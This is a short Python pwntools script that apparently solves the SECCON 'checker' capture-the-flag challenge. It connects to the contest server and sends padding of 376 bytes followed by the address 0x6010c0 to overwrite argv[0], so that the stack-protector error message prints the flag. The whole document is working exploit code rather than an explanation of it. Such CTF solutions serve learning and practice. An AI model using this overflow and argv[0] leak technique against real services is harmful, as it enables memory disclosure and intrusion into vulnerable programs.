#!/usr/bin/env python
from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('checker.pwn.seccon.jp', 14726)

flag_txt = 0x6010c0

print r.recvuntil('NAME : ')

raw_input('#')

r.sendline('A'*8)

# padding offset of argv[0] is 376

for i in range(5, 2, -1):
    print r.recvuntil('>> ')
    r.sendline('B' * (376+i))

print r.recvuntil('>> ')
r.sendline('B'*376 + p64(flag_txt))

print r.recvuntil('>> ')
r.sendline('yes')

r.sendlineafter('FLAG : ', 'Q'*8)

print r.recv()

r.interactive()
